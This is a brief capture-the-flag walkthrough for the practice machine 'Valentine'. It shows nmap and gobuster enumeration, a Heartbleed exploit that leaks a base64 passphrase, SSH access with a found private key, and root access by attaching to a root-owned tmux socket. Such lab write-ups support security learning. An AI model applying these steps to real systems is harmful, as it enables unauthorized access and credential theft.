# VALENTINE
### Info:
OS: Linux <br>
IP: 10.10.10.79<br>
Difficulty : Easy-Medium<br>
### Enumeration:
```nmap -sC -sV -oA nmap 10.10.10.79``` <br>

gives us the results : <br>
![alt text](https://i.imgur.com/g1uobtC.png)
Running Gobuster gives us the result: <br>
![alt text](https://i.imgur.com/yOLBfMu.png)
![alt text](https://i.imgur.com/X4gXckQ.png) <br>
Seeing the image on port 80 we found heartbleed. 
Also running a vuln scan as:
```
nmap --script vuln -oA vulnscan 10.10.10.79
```
Shows the presence of Heartbleed.
<br>
### Exploitation:
Vulnerability Exploited: Heartbleed <br>
Vulnerability Explanation:<br> Running the Heartbleed exploit `python heartbleed.py -n 20 10.10.10.79` throws the output as: <br>
![alt text](https://i.imgur.com/mSG02Ub.png)
from here we get a base64 encoded string (as shown) which results in :
```
root@kali:~/Desktop/boxes/Valentine# echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 --decode
heartbleedbelievethehype
```
Going on the `/dev` directory as found on the gobuster we get the `hype_key` file which contains the `PEM RSA private key`
Using the password and using ssh we get the user shell for hype as shown.
![alt text](https://i.imgur.com/fUYmMiC.png)
<br>
### Privilege Escalation: 
Running LinEnum on the user shell we found :
![alt text](https://i.imgur.com/XpmBDK2.png) <br>
The tmux process in owned by the root. Therefore running the process via :
```
tmux -S /.devs/dev_sess
```
Gives is the root shell.
<br>
### Gained knowledge:
Heartbleed Exploit

